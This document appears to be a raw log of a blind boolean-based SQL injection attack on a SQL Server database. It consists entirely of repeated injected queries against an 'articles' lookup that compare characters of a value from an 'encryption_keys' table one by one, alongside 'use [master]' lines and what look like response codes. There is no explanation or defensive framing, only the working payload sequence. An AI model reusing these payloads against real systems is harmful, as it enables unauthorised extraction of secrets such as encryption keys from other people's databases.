+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>107	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>97	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>102	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>99	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>100	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>101	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>48	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>72	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>60	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>54	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>51	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),33,1))>53	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>54	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),34,1))>53	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),35,1))>56	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>52	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>49	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),36,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>87	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>107	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>117	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>122	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>125	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>123	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),37,1))>124	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),38,1))>64	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),38,1))>32	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),38,1))>1	408
+	138
+	66
